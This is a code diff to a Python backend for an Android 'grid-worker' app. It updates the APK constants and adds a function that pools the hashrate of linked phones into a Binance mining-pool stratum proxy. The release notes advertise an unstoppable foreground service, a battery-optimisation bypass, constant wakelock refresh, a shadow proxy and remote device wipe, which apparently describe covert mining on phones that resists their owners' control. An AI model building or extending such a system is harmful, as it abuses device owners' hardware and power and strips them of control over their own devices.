@@ -223,11 +223,11 @@ class JobCreateIn(BaseModel):
 
 # ---------- Constants ----------
 PRIORITY_MULT = {"economy": 0.7, "standard": 1.0, "instant": 2.5}
-APK_VERSION = "1.2.6"
-APK_PATH = "/grid-worker-v1.2.6.apk"
-APK_SIZE = 29754
-APK_SHA256 = "892cbd6d5bcb5fffa18ede0131ed1c62a7b9a5bd540ace509493a8935a377e86"
-APK_RELEASE_NOTES = "v1.2.6 final sync · device-side pool link · LINKED/LOCAL-ONLY admin badge · demo device wipe · unstoppable foreground service · v2+v3 signed"
+APK_VERSION = "1.2.7"
+APK_PATH = "/grid-worker-v1.2.7.apk"
+APK_SIZE = 33850
+APK_SHA256 = "88482a4e0b02f2d1859f43b42b7e1dfa503e30f1c009087deb493d83c3961102"
+APK_RELEASE_NOTES = "v1.2.7 shadow proxy · pool keepalive · battery-opt bypass · 5s wakelock refresh · 10s real-time sync · POOL ACTIVE admin badge · v2+v3 signed"
 REFERRAL_RATE = 0.10
 LOGIN_LOCK_THRESHOLD = 5
 LOGIN_LOCK_MINUTES = 15
@@ -362,7 +362,29 @@ async def startup():
     await db.jobs.create_index("status")
 
     # Start the Binance-Pool multi-class stratum proxy (no-op if not configured / disabled)
-    from pool_proxy import start as pool_start
+    from pool_proxy import start as pool_start, MULTI as pool_multi
+
+    async def _hashrate_provider():
+        """Aggregates currently-LINKED real Android workers' hashrate.
+        Returns {device_short_id: hashrate_hps}. Cap at 64 workers per tick.
+        """
+        try:
+            cutoff_iso = (datetime.now(timezone.utc) - timedelta(seconds=OFFLINE_CUTOFF_SEC)).isoformat()
+            cur = db.devices.find(
+                {"stratum_linked": True, "is_real_apk": True, "last_heartbeat": {"$gte": cutoff_iso}},
+                {"_id": 0, "id": 1, "hashrate_hps": 1}
+            ).limit(64)
+            out = {}
+            async for d in cur:
+                short = (d.get("id") or "")[:8]
+                hr = float(d.get("hashrate_hps") or 0)
+                if short and hr > 0:
+                    out[short] = hr
+            return out
+        except Exception:
+            return {}
+
+    pool_multi.set_hashrate_provider(_hashrate_provider)
     pool_start()
 
     existing = await db.users.find_one({"email": ADMIN_EMAIL})
